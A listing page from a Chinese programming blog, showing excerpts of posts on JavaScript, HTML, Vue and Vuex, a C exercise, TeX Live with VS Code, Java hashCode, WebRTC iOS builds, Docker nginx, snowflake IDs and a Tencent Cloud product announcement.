小结: JavaScript 是一种专为与网页交互而设计的脚本语言，由下列三个不同的部分组成：  ECMAScript ，由 ECMA-262 定义，提供核心语言功能；  文档对象模型（ DOM ），提供访问和操作网页内容的方法和接口；  浏览器对象模型（ BOM ），提供与浏览器交互的方法和接口。 JavaScript 的这三个组成部分，在当前五个主要浏览器（ IE 、 Firefox 、 Chrome 、 Safari 和 Opera ）中 都得到了不同程度的支持。其中，所有浏览器对 ECMAScript 第 3 版的支持大体上都还不错，而对 ECMAScript 5 的支持程度越来越高，但对 DOM 的支持则彼此相差比较多。对已经正式纳入 HTML5 标 准的 BOM 来说，尽管各浏览器都实现了某些众所周知的共同特性，但其他特性还是会因浏览器而异。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/302fa7c0bcc6839848060f6256cc7d51/" rel="bookmark">
			2021.11.9洛谷苹果与虫子——c语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 八尾勇喜欢吃苹果。她现在有(m≤100) 个苹果，吃完一个苹果需要花费 t(0≤t≤100) 分钟，吃完一个后立刻开始吃下一个。现在时间过去了s(s≤10000) 分钟，请问她还有几个完整的苹果？
输入格式 输入三个非负整数表示 m 、t 和 s。
输出格式 输出一个整数表示答案。
如果你出现了 RE，不如检查一下被零除？
输入输出样例 输入 50 10 200 输出 30 这一道题其实有三个坑
1、当t=0时，苹果是一定能吃完的
2、当s/t &gt; m时用m-s/t算出来是负数，实际值应该为0
3、这道题当s/t为小数的时候，应该向上取整，因为题目所问的是有多少个完整的苹果，所以当s%t！=0时 输出的值应该为m-s/t-1
三个坑都了解清楚了，那么就用if语句来解决吧
上代码
#define _CRT_SECURE_NO_WARNINGS 1//取消警告 #include&lt;stdio.h&gt; int main() { int m, s, t; scanf("%d %d %d", &amp;m ,&amp;t ,&amp;s); if (t == 0) { printf("0"); } else { if (s % t == 0) { if (m &gt; s / t) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/302fa7c0bcc6839848060f6256cc7d51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057fd6ae8ca6c7faf2ba84b9fc5a5065/" rel="bookmark">
			第一篇.了解HTML
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习HTML和CSS首先要知道它是用来干什么的？
先简单说一下，它们主要用于网页开发，html主要布局网页的结构，css主要是用来美化网页的，只用html和css只能做静态网页，无法实现用户与网页的交互效果，那需要用javascript，php，java等。
1.了解网页和网站
2.简述HTML
3.web标准
1.了解网页和网站 1.1 什么是网页 1.1.1网页概念 网页其实就是放在服务器上的一个文件，当我们浏览网页时，这个文件会被下载到我们本地的电脑，然后再由浏览器解析，渲染出各种漂亮的界面，比如表格、图片、标题、列表等。
网页是网站中的一“页”，通常是 HTML 格式的文件，它要通过浏览器来阅读。 网页是构成网站的基本元素，它通常由图片、链接、文字、声音、视频等元素组成。通常我们看到的网页，常见以 .htm 或 .html 后缀结尾的文件，因此将其俗称为 HTML 文件。 这是随手做的网页，非常简陋，仅作为例子来演示，真实网页的 HTML 代码远比这复杂，你可以在网页上单击鼠标右键，然后在弹出菜单中选择“查看网页源代码”，就可以查看当前网页的 HTML 代码。
1.1.2网页的形成 网页是由网页元素组成的，这些元素是利用 html 标签描述出来，然后通过浏览器解析来显示给用户的。 1.2 什么是网站 网站是由一个一个网页构成的，是指在因特网上根据一定的规则，使用 HTML 等制作的用于展示特定内容相关的网页集合。
作为初学者也不好过多赘述，更多详情
2.简述HTML 2.1什么是HTML HTML 指的是超文本标记语言 (Hyper Text Markup Language) ，它是用来描述网页的一种语言，专门用来设计和编辑网页。
HTML 不是一种编程语言，而是一种标记语言 (markup language)。
标记语言是一套标记标签 (markup tag)。
所谓超文本，有 2 层含义： 1. 它可以加入图片、声音、动画、多媒体等内容（超越了文本限制 ）。 2. 它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接（超级链接文本 ） 使用 HTML 编写的文件称为“HTML 文档”，后缀一般为.html（也可以使用.htm，不过比较少见）。
每个网页都是一个 HTML 文档，使用浏览器访问一个链接（URL），实际上就是下载、解析和显示 HTML 文档的过程。将众多 HTML 文档放在一个文件夹中，然后提供对外访问权限，就构成了一个网站。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/057fd6ae8ca6c7faf2ba84b9fc5a5065/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/548b7ff0e8bcfaaa307c3dc7b5c456d4/" rel="bookmark">
			在js中修改html、body的样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、原始定义 先在css中定义：body, html 宽高为300px
body, html { width: 300px; height: 300px; } 二、js操作，以修改宽度为例 // 获取body、html节点style（主要是这里html，一开始不清楚获取方式） let bodyStyle = document.body.style let htmlStyle = document.getElementsByTagName('html')[0].style // 获取浏览器的宽度，width 也可以设置为任意值 let width = document.documentElement.clientWidth || document.body.clientWidth // 重置body宽度 bodyStyle.width = `${width}px` // 重置html宽度 htmlStyle.width = `${width}px` // 或者其他样式的修改，如： htmlStyle['min-width'] = `${width}px` 三、效果：宽度已被修改 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3503b3501f5625045358e685d07926b/" rel="bookmark">
			第39节 显示模型的法线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 本节内容本节代码思路具体实现注意以下为全部代码 本节内容 经常的我们想看看模型的法线对不对，如本节下图所示：
我们就想把模型的法线绘制出来。本节就介绍这个小功能。
本节代码 本节资源在如下链接/文件中的附件/按章节编号目录中：
【击此打开网盘资源链接】
也可以在本文末获取
思路 遍历所有的Geode，然后将其里面所有的Geometry的，凡是有法线的，都给生成法线。法线的起点是该顶点，方向是法线的方向，长度可以根据包围盒的半径大小来。
具体实现 1、我们遍历模型的所有的Geode
class BuildNormal : public osg::NodeVisitor { public: BuildNormal() :osg::NodeVisitor(osg::NodeVisitor::TRAVERSE_ALL_CHILDREN) {} virtual void apply(osg::Geode&amp; gnode) { 在这里做事情 } } 2、遍历gnode中所有的Geometry
virtual void apply(osg::Geode&amp; gnode) { //先看其里有多少个geometry，给每个geometry的每个顶点的法线生成一条实体线，再添加到gnode中 //因为添加之后gnode的子结点就会增多，为了避免给法线的实体线再生成法线，因此这里先获取 int geomNum = gnode.getNumDrawables(); for (int i = 0; i &lt; geomNum; i++) { osg::Geometry* geom = gnode.getDrawable(i)-&gt;asGeometry(); if (nullptr != geom) { //在这里搞事情 } } traverse(gnode); } 3、如果geom有逐顶点绑定的法线则申请几何体开始绘制：
if (nullptr !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3503b3501f5625045358e685d07926b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33fe76d9e4955911a4e3158baed27f5d/" rel="bookmark">
			教教小周做学术的道理第二弹之texlive&#43;vscode环境配置太爽了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 texlive安装SumatraPDF安装vscode配置 之前一直用的ctex带的啥windet编辑器，每次修改就得找那段文字对应的代码，可费劲了而且我也想右边是pdf左边是编辑器那种，ctex太不方便了我本来想着能不能把编辑器换成vscode，因为在里面写markdown右边直接能看编辑的效果嘛，就想搭建一个ctex内核+vscode编辑器的环境查了好多资料后失败了，我找不到ctex的环境变量，编译latex时一直报错我去b站看了下，基本都是texlive+texstudio的配置，随便点看一个，好家伙，首先就劝人家不要下载ctex组件说是ctex当时创建是为了解决texlive不能编辑汉字的bug，已经十几年没有更新了，我说界面咋那么丑呢，现在texlive已经支持汉字了，下texlive就行啦因为我已经下了vscode编辑器了，所以就不用texstudio了，而且用vscode太爽了，不说别的，就自动给填充单词这一条就让我原地起飞这次安装主要参考一个up主的，他在csdn上也有号，也把视频整理成了文章：https://blog.csdn.net/weixin_44960315/article/details/107144884我记录一下安装过程和遇到的bug，等着下次继续教小周做学术的道理（记得所有软件的路径最好不要有中文！！！） texlive安装 去清华，中科大那些镜像网址上下个texlive的镜像https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/下载好之后，win10双击就行，win8还要解压一下，进文件夹后，找到后缀为bat的文件，右键管理员运行！！！！（一定要右键管理员运行，视频里没提这个，我老是安装失败，一秒钟几句停止了，查了原因才知道是这个原因）然后就会弹出一个小牛牛，左下角有一个“advanced”点击它然后选择安装位置，应该都可以，我看有人说千万不要安在c盘，我d盘没空了，只能安在c盘，后面也没报错然后不要选“安装texwork”前端啊，因为我们要和vscode一起，这里就不用选了，再点击“customize”,x选择语言，就选英文和中文即可，能省将近一个G呢然后点“安装”就行，得安挺久的，该干啥就干啥去吧，让他自己安安好了之后，win+R弹出注册表，输入cmd在命令行里输入 pdflatex -v看texlive是不是安好了，要是直接出来版本的名称啥的，说明texlive就安好啦最后要添加一下环境变量，还是win+R,然后输入sysdm.cpl→高级→环境变量弹出如下框，再选择“系统变量”中的path，编辑一下，在已有的编环境变量后加一个英文分号;然后输入C:\Windows\System32texlive就弄好啦 SumatraPDF安装 这个软件主要是实现双向追击的效果啦，比如你双击pdf中的一个单词，马上就能定位到代码位置，或者双击代码位置能定位到pdf对应的地方，但要注意的是，好像有一个bug，在用vscode之前好像得先打开这个pdf阅读器好像，我忘了下载地址https://www.sumatrapdfreader.org/download-free-pdf-viewer说最好选这个离线的包 vscode配置 去官网安装一下vscode在扩展程序中安装“latex workshop”再进入vscode的setting.json文件里（左下角有一个“管理”，点击，再找到设置）然后，加入以下代码，需要注意的是，如果你是刚安装vscode的用户，可以把这个代码复制粘贴，但如果你已经有vscode了，粘贴过去之后记得把这个代码里的第一个大括号和最后一个大括号删除哦，还有在已有的代码最后加个逗号哦 { "latex-workshop.latex.tools": [ { "name": "pdflatex", "command": "pdflatex", "args": [ "-synctex=1", "-interaction=nonstopmode", "-file-line-error", "%DOC%" ] }, { "name": "xelatex", "command": "xelatex", "args": [ "-synctex=1", "-interaction=nonstopmode", "-file-line-error", "%DOC%" ] }, { "name": "bibtex", "command": "bibtex", "args": [ "%DOCFILE%" ] } ], "latex-workshop.latex.recipes": [ { "name": "pdflatex", "tools": [ "pdflatex" ] }, { "name": "xelatex", "tools": [ "xelatex" ] }, { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33fe76d9e4955911a4e3158baed27f5d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7613ea4578d98aec8c073d29bbe9136/" rel="bookmark">
			java默认的hashcode方法到底得到的是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hashcode方法会影响jvm性能？听上去天方夜谭，实际上蕴藏着一些微小的原理，接下来让我们走进hashcode方法，一探native方法源头。
默认实现是什么？
调用hashCode方法默认返回的值被称为identity hash code（标识哈希码），接下来我们会用标识哈希码来区分重写hashCode方法。如果一个类重写了hashCode方法，那么通过调用System.identityHashCode(Object o)方法获得标识哈希码。
在hashCode方法注释中，说hashCode一般是通过对象内存地址映射过来的。
As much as is reasonably practical, the hashCode method defined by class {@code Object} does return distinct integers for distinct objects. (This is typically implemented by converting the internal address of the object into an integer, but this implementation technique is not required by the Java&lt;font size="-2"&gt;&lt;sup&gt;TM&lt;/sup&gt;&lt;/font&gt; programming language.) 但是了解jvm的同学肯定知道，不管是标记复制算法还是标记整理算法，都会改变对象的内存地址。鉴于jvm重定位对象地址，但该hashCode又不能变化，那么该值一定是被保存在对象的某个地方了。
我们推测，很有可能是在第一次调用hashCode方法时获取当前内存地址，并将其保存在对象的某个地方，当下次调用时，只用从对象的某个地方获取值即可。但这样实际是有问题的，你想想，如果对象被归集到别的内存上了，那在对象以前的内存上创建的新对象其hashCode方法返回的值岂不是和旧对象的一样了？这倒没关系，java规范允许这样做。
以上都是我们的猜测，并没有实锤。我们来看一下源码吧，可恶，hashCode方法是一个本地方法。
public native int hashCode(); 真正的hashCode方法
hashCode方法的实现依赖于jvm，不同的jvm有不同的实现，我们目前能看到jvm源码就是OpenJDK的源码，OpenJDK的源码大部分和Oracle的JVM源码一致。
OpenJDK定义hashCode的方法在 src/share/vm/prims/jvm.h 和 src/share/vm/prims/jvm.cpp。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7613ea4578d98aec8c073d29bbe9136/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bfc299d21bfea46e2c6580edb2b17c8/" rel="bookmark">
			Windows10剪贴板的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在windows10操作系统中，有一个非常好用的软件——剪贴板。使用快捷键（win+v）可打开剪贴板。
在剪贴板中历史记录可最多存放25条，容量限制大小为每项4MB，共25个复制条目，先进先出。（2018年10月更新）
剪贴内容产生的历史记录可固定，固定的内容保存在磁盘中，不影响25条复制条目。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6f238f9bbf5c546e4368e1745245ff4/" rel="bookmark">
			VSCode XML文件格式化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装插件：
格式化：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d07ea67505ddd13e18bf5fc6b4d12439/" rel="bookmark">
			IOS技术分享| WebRTC iOS源码下载&amp;编译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最近对 WebRTC iOS 端源码进行了下载和编译，网上针对 WebRTC iOS 端的编译文章基本都是几年前的，有些地方已经不适用于最新版的 WebRTC 的编译，简单记录下载&amp;编译的过程，以 M93 版本为例。
编译环境 硬件：MacBook Pro (Retina, 15-inch, Mid 2015)
系统：macOS Big Sur 11.5
安装 depot_tools depot_tools 是一套 Google 用来编译 Chromium 或者 WebRTC 的构建工具，获取 depot_tools 源码前，需开启 VPN 服务。
$ mkdir webrtc $ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git 如果出现如下错误，首先检查 VPN 是否连接成功，其次配置 macOS 终端代理
配置终端代理
在开启的 VPN 客户端偏好设置中配置信息如下：
注意：配置终端代理只对当前终端有用，重启后需要重新配置
$ export http_proxy=http://127.0.0.1:10887 $ export https_proxy=http://127.0.0.1:10887 $ export all_proxy=http://127.0.0.1:10887 配置环境变量
$ echo "export PATH=$PWD/depot_tools:$PATH" &gt; $HOME/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d07ea67505ddd13e18bf5fc6b4d12439/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccef95314aa0aa1b734657d0c2f66ea2/" rel="bookmark">
			腾讯云TI平台再升级，引领AI开发新浪潮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在11月4日召开的2021腾讯数字生态大会腾讯云智能专场上，腾讯云TI平台迎来全新升级发布，升级后的腾讯云TI平台包含三大能力平台，分别是机器学习平台TI-ONE，AI应用服务平台TI-Matrix，数据标注平台TI-DataTruth。
腾讯云副总裁、腾讯优图实验室总经理吴运声表示，“作为下一个十年最核心的科技之一，AI技术正在加速渗透到千行百业，腾讯云一直在探索如何通过AI技术高效解决行业的挑战，如何运用腾讯内部持续沉淀的AI能力降低千行百业落地AI的门槛，腾讯云TI平台的推出将有效解决行业面临的诸多挑战。”
腾讯云副总裁、腾讯优图实验室总经理吴运声
据了解，作为全栈式人工智能开发服务平台，腾讯云TI主要是用来解决感知、认知、决策三大基础研究领域问题，让AI能够真正实现低门槛的智能接入。腾讯云TI平台有三个特点：轻松上手、场景解耦、满足AI开发管理应用全环节需求，目前已经成为六大行业应用产品的AI核心底座。
今年9月，在全球知名市场调研机构弗若斯特沙利文及头豹研究院联合发布的中国AI系列报告之《2021年中国AI开发平台市场报告》年度报告中，腾讯云TI平台还凭借着突出的技术能力和创新指数，在中国AI开发平台应用市场综合竞争表现中位居领导者象限。
▲产品架构全面升级▲ 三大平台、九大中心
自由组合快速构建行业应用
此次，腾讯云TI平台的产品架构进行了全面升级，做到了将场景能力化，能力组件化，组件轻量化，面向行业场景，输出三大能力平台，九大能力中心。
其中，机器学习平台TI-ONE主要面向算法和模型开发者，可以为其提供从数据预处理、模型训练、自动学习、模型评估到模型发布部署的全流程支持；AI应用服务平台TI-Matrix则面向AI应用提供商，能够快速接入模型、数据和智能设备。提供模型服务、应用工作流编排、云边端调度等功能，快速构建智能应用；而数据标注平台 TI-DataTruth主要面向AI数据服务提供商，提供多场景数据智能标注、数据标注众包管理、场景数据挖掘等智能数据生产服务。
基于此，三大能力平台可进一步解耦至应用中心、应用编排、模型服务、边缘中心、数据中心、自动学习、训练工坊、模型管理、管理中心等九大能力中心，覆盖了AI开发管理应用的全流程能力。各能力中心均可以为行业应用降低底层计算，存储，网络，容器等各类基础设施的复杂度，使得行业应用在构建解决方案时，可自由组合AI能力快速构建行业应用。
▲产品功能特性全面升级▲ 应用全环节覆盖实现降本增效
不仅如此，在产品功能特性方面，为满足用户AI开发、管理、应用全环节的需求，腾讯云TI平台在各环节均取得了技术突破，全面提升用户开发，部署效率，降低系统管理成本。
在数据接入环节，平台在预置了4大类，15+商用数据源接入的基础上，为企业客户提供了自助式的新数据源接入功能，可为系统工程师和交付工程师缩短80%的数据接入周期；在数据加工环节，平台提供了基于主动学习的智能标注能力，同时为大规模数据标注提供了企业级的标注流程管控能力，为数据工程师降低70%的标注成本。
在模型训练及部署环节，建模工程师可在线上线下进行协同开发，也可一键沉淀算法能力，快速封装上线自动学习场景，为企业日常业务场景扩充低门槛的训练工具；在模型服务运营环节，为应用开发人员提供了可视化的编排工具，可在云、边、端进行协同服务编排，实现模型一处训练各处运行。
▲平台开发工具全面升级▲ 一个平台满足多维度开发需求
值得一提的是，此次升级中，腾讯云TI平台还以数据科学家、资深算法工程师等开发者为中心，全面升级了平台开发工具。
例如可视化拖拽式建模工具，可以让数据科学家在不用写代码的情况下，快速配置模型生产链路并进行可视化效果评估；面向资深算法工程师则提供了TI-KIT SDK工具包，可在线上及线下进行协同开发，将AI平台训练推理能力灵活集成至已有的应用程序中。
此外，资深算法工程师可利用平台的IDE开发环境一键沉淀算法开发成果，发布成自动学习场景，让业务人员及数据科学家以简单的方式完成复杂的场景化模型训练任务，最后业务人员和应用开发者可以进一步利用应用拖拽式编排工具，将训练出的模型发布成包含负责业务逻辑的AI应用，并对应用的每一个环节进行可视化的效果监控，真正做到一个平台，多种工具，以开发者为中心，满足多维度开发需求。
经过腾讯内部大量算法工程师和复杂真实业务的持续考验，目前，腾讯云TI平台已在泛政务，金融，传媒，工业，医疗等诸多行业被客户选为构建自有AI能力的唯一平台。
在腾讯内部，已经有超过100+可商用的算法通过腾讯云TI平台对外服务，不仅如此，今年基于升级后的TI平台已交付客户项目已超过30个，另外还有10多个行业合作伙伴基于新平台向客户交付AI解决方案。
随着AI由技术落地应用向效率化生产阶段的转变，智能决策场景的不断增多，中国AI开发平台的市场潜力愈发巨大，未来，腾讯云在其中将不断丰富AI开发平台的创新能力和服务能力，打造人工智能数字经济安全基座，为开发者及行业专家们提供更加丰富的平台化能力，为各行各业提供解决方案，持续引领国内AI开发平台发展新浪潮。
点击此处了解更多腾讯云AI产品解决方案
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a924589690fbe95e1420b248f9d2e71/" rel="bookmark">
			在 Vue 中为什么不推荐用 index 做 key
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		性能消耗
使用 index 做 key，破坏顺序操作的时候， 因为每一个节点都找不到对应的 key，导致部分节点不能复用,所有的新 vnode 都需要重新创建。
例子：
&lt;template&gt; &lt;div class="hello"&gt; &lt;ul&gt; &lt;li v-for="(item,index) in studentList" :key="index"&gt;{{item.name}}&lt;/li&gt; &lt;br&gt; &lt;button @click="addStudent"&gt;添加一条数据&lt;/button&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'HelloWorld', data() { return { studentList: [ { id: 1, name: '张三', age: 18 }, { id: 2, name: '李四', age: 19 }, ], }; }, methods:{ addStudent(){ const studentObj = { id: 3, name: '王五', age: 20 }; this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a924589690fbe95e1420b248f9d2e71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dd0b5067122e23b838676f4024767f0/" rel="bookmark">
			集信达项目收获总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		集信达项目收获总结 1.什么是中台插件 将重复的代码剥离，形成中台的组件
2.集信达中台的作用 一旦我们的短信服务商不好用了，我么短信平台能够自动的选举出新的通道，不会让我们的系统服务停止
3了解了集信达项目的部署和每个模块的作用 接收服务:pd-sms-api 主要用于接收公司内部需要调用集信达平台的请求
管理后台:pd-sms-manage 维护短信通道配置信息，签名配置信息，模板配置信息，接入平台的配置信息，查看日志，人工处理
发送服务:pd-sms-server api服务接收到发送请求后，讲数据传递给server服务，server服务确定调用的第三方服务 如：阿里云，网易云信
4基础属性自动注入 功能：通过自定义注解和切面，在进行数据维护时实现实体中基础属性的自动赋值（创建者、创建时间、修改者、修改者）。
自定义注解：
注解@interface 与interface class是同一个级别的，相当于一种记号，注解本身是没有功能的，只有在解析注解的时候才可以添加一些功能，注解的底层是通过反射来实现的。
@Documented：
类和方法的 Annotation 在缺省情况下是不出现在 javadoc 中的。如果使用 @Documented 修饰该 Annotation，则表示它可以出现在 javadoc 中。定义 Annotation 时，@Documented 可有可无；若没有定义，则 Annotation 不会出现在 javadoc 中。
@Target(ElementType.TYPE)：
ElementType 是 Annotation 的类型属性。而 @Target 的作用，就是来指定 Annotation 的类型属性。
@Target(ElementType.TYPE) 的意思就是指定该 Annotation 的类型是 ElementType.TYPE。这就意味着，MyAnnotation1 是来修饰"类、接口（包括注释类型）或枚举声明"的注解。
定义 Annotation 时，@Target 可有可无。若有 @Target，则该 Annotation 只能用于它所指定的地方；若没有 @Target，则该 Annotation 可以用于任何地方。
@Targer() 约束自定义注解可以在什么地方，值是从ElementType里获取的，可以添加多个:
public enum ElementType {
TYPE, 类、接口（包括注释类型）或枚举声明
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dd0b5067122e23b838676f4024767f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79776c8dd0840a149e75f6d932704edb/" rel="bookmark">
			雪花算法（个人笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于雪花 雪花(snowflake)在自然界中，是极具独特美丽，又变幻莫测的东西：
雪花属于六方晶系，它具有四个结晶轴，其中三个辅轴在一个基面上，互相以60度的角度相交，第四轴(主晶轴)与三个辅轴所形成的基面垂直；雪花的基本形状是六角形，但是大自然中却几乎找不出两朵完全相同的雪花，每一个雪花都拥有自己的独有图案，就象地球上找不出两个完全相同的人一样。许多学者用显微镜观测过成千上万朵雪花，这些研究最后表明，形状、大小完全一样和各部分完全对称的雪花，在自然界中是无法形成的。 雪花算法 雪花算法的原始版本是scala版，用于生成分布式ID（纯数字，时间顺序）,订单编号,骑手,优惠券等。
自增ID：对于数据敏感场景不宜使用，且不适合于分布式场景。GUID：采用无意义字符串，数据量增大时造成访问过慢，且不宜排序。 ID生成规则部分硬性要求：
全局唯一：不能出现重复的ID号，既然是唯一-标识，这是最基本的要求
趋势递增：在MySQL的InnoDB引擎中使用的是聚集索引，由于多数RDBMS使用Btree的数据结构来存储索引数据，在主键的选择上面我们应该尽量使用有序的主键保证写入性能。
单调递增：保证下一个ID一定大于上一个ID，例如事务版本号、IM增量消息、排序等特殊需求
信息安全：如果ID是连续的，恶意用户的扒取工作就非常容易做了，直接按照顺序下载指定URL即可。如果是订单号就更危险了，竞对可以直接知道我们一天的单量。所以在一些应用场景下，需要ID无规则不规则，让竞争对手否好猜。
含时间戳：这样就能够在开发中快速了解这个分布式id的生成时间。
ID号生成系统的可用性要求：
高可用：发一个获取分布式ID的请求，服务器就要保证99.999%的情况下给我创建一个唯一分布式ID。
低延迟：发一个获取分布式ID的请求，服务器就要快，极速。
高QPS：假如并发一口气10万个创建分布式ID请求同时杀过来，服务器要顶的住且一下子成功创建10万个分布式ID。
一般通用方案：
方法1：
UUID(Universally Unique ldentifer)的标准型式包含32个16进制数字，以连字号分为五段，形式为8位-4位-4位-4位-12位的36个字符， 示例：550e8400-e29b-41d4-a716-446655440000
优点：性能非常高、本地生成，没有网络消耗，唯一性也是OK的。缺点：入数据库性能差，生产环境下不适合使用。（此方法不可行，只满足了5个硬性要求里的1个要求：全局唯一要求） 无序，无法预测他的生成顺序，不能生成递增有序的数字。首先分布式ID一般都会作为主键， 但是MySQL官方推荐主键要尽量越短越好，UUID每一个都很长，所以不是很推荐。主键，ID作为主键时在特定的环境会存在一些问题。比如做DB主键的场景下，UUID就非常不适用MySQL官方有明确的建议主键要尽量越短越好，而36个字符长度的UUID不符合要求。索引，既然分布式ID是主键，然后主键是包含索引的，然后MySQL的索引是通过B+树来实现的，每一次新的UUID数据的插入，为了查询的优化，都会对索引底层的B+树进行修改，因为UUID数据是无序的，所以每一次UUID数据的插入都会对主键地械的B+树进行很大的修改，这一点很不好。 插入完全无序，不但会导致一些中间节点产生分裂，也会白白创造出很多不饱和的节点，这样大大降低了数据库插入的性能。 方法2：
数据库自增主键方法，又分了2种形式：单机、集群分布式。
单机（此方法可行，生产规模不大的项目中可使用）：在单机里面，数据库的自增ID机制的主要原理是：数据库自增ID和MySQL数据库的replace into实现。REPLACE INTO的含义是插入一条记录，如果表中唯一索引的值遇到冲突，则替换就数据。
replace into跟inset功能类似，不同点在于：replace into首先尝试插入数据列表中，如果发现表中已经有此行数据（根据主键或唯一索引判断）则先删除，再插入。否则直接插入新数据。
-- 创建一张测试表，stub字段设置了唯一索引。 CREATE TABLE t_test( id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY, stub CHAR(1) NOT NULL DEFAULT '', UNIQUE KEY stub(stub) ) -- 查询表数据 SELECT * FROMt_ test; -- 第一次插入一条数据，主键索引的值是1，第二次再次执行会根据主键或唯一索引判断，是否存在，存在则先删除，再插入。 REPLACE INTO t_test (stub) VALUES('b'); -- 查询当前主键索引 SELECT LAST_INSERT_ID(); 集群分布式（此方法不可行）：数据库自增ID机制不太适合作分布式ID，理由如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79776c8dd0840a149e75f6d932704edb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bc791da4ba68644788022cab27bb832/" rel="bookmark">
			【docker】 x【 nginx】通过docker使用nginx
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 nginx初始化docker拉取nginx镜像实例化nginx镜像启动nginx nginx常用命令查看nginx版本号关闭nginx启动nginx重新加载nginx nginx配置文件全局块events块http块http全局块server块 nginx配置反向代理简单代理复杂代理 nginx配置负载均衡轮询weightip_hashfair（第三方） nginx配置动静分离 nginx初始化 docker拉取nginx镜像 [root@Dragon ~]# dk pull nginx 实例化nginx镜像 [root@Dragon ~]# dk run -it --name nginx1 -p 80:80 nginx /bin/bash WARNING: IPv4 forwarding is disabled. Networking will not work. 有一个警告意思是ipv4的转发未开启先不管
启动nginx 找一下启动文件
root@65493cd4789a:/usr/local/sbin# find / -name nginx # 下面是输出的结果 /etc/default/nginx /etc/init.d/nginx /etc/logrotate.d/nginx /etc/nginx find: '/proc/1/map_files': Operation not permitted find: '/proc/11/map_files': Operation not permitted /usr/lib/nginx /usr/sbin/nginx /usr/share/doc/nginx /usr/share/nginx /var/cache/nginx /var/log/nginx /usr/sbin/nginx看起来比较像
cd进去，找到了，然后运行./nginx命令启动nginx
root@65493cd4789a:/usr/local/sbin# cd /usr/sbin root@65493cd4789a:/usr/sbin# .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bc791da4ba68644788022cab27bb832/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0aeb42e5bb59305cc6393e6aeab24b49/" rel="bookmark">
			Vuex 的 5 个核心属性是什么? （精选 持续更新中 ---）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vuex五大核心属性是：state，getter，mutation，action，module 1、state：存储数据，存储状态；在根组件实例中注册了store 后，用 this.$store.state 来访问；对应vue里面的data；存放数据方式为响应式，vue组件从store中读取数据，如数据发生变化，组件也会对应的更新。
2、getter：可以对state 进行计算操作，它的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。
3、mutation：更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。
4、action：包含任意异步操作，通过提交 mutation 间接更变状态。
5、module：面对复杂的应用程序，当管理的状态比较多时；我们需要将vuex的store对象分割成模块(modules),进行模块化管理
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
